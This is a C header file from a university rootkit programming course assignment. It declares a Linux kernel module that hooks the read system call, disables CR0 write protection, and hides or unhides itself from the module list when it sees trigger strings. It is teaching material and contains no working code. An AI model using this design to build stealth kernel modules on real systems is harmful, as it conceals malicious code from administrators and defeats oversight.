
/*******************************************************************************/
/*                                                                             */
/*   Course: Rootkit Programming                                               */
/*   Semester: WS 2015/16                                                      */
/*   Team: 105                                                                 */
/*   Assignment: 5                                                             */
/*                                                                             */
/*   Filename: module_masker.h                                                 */
/*                                                                             */
/*   Authors:                                                                  */
/*       Name: Matei Pavaluca                                                  */
/*       Email: mateipavaluca@yahoo.com                                        */
/*                                                                             */
/*       Name: Nedko Stefanov Nedkov                                           */
/*       Email: nedko.stefanov.nedkov@gmail.com                                */
/*                                                                             */
/*   Date: November 2015                                                       */
/*                                                                             */
/*   Usage: Header file for kernel module `module_masker.c`.                   */
/*                                                                             */
/*******************************************************************************/

#ifndef __MODULE_MASKER__
#define __MODULE_MASKER__

/* Definition of macros */
#define CR0_WRITE_PROTECT_MASK (1 << 16)
#define HEARTBEAT "ping"
#define HEARTBEAT_RESPONSE "pong"
#define VOILA "unhide"


/* Definition of global variables */
static int module_is_hidden;	/* Current state of module (1 ~> hidden) */
int heartbeat_matched_so_far;	/* Characters of HEARTBEAT matched so far */
int voila_matched_so_far;		/* Characters of VOILA matched so far */
void **syscall_table;
asmlinkage long (*original_read_syscall)(unsigned int, char __user *, size_t);
static struct list_head *module_prev;


/* Declaration of functions */
void disable_write_protect_mode(void);
void enable_write_protect_mode(void);

asmlinkage long my_read_syscall(unsigned int, char __user *, size_t);
int count_matches(char *, char *, int *);

void hide_module(void);
void unhide_module(void);

/* Implementation of functions below is taken from fs/kernfs/dir.c, lines 224-321 */
static bool kernfs_unlink_sibling(struct kernfs_node *kn);
static int kernfs_link_sibling(struct kernfs_node *kn);

#endif
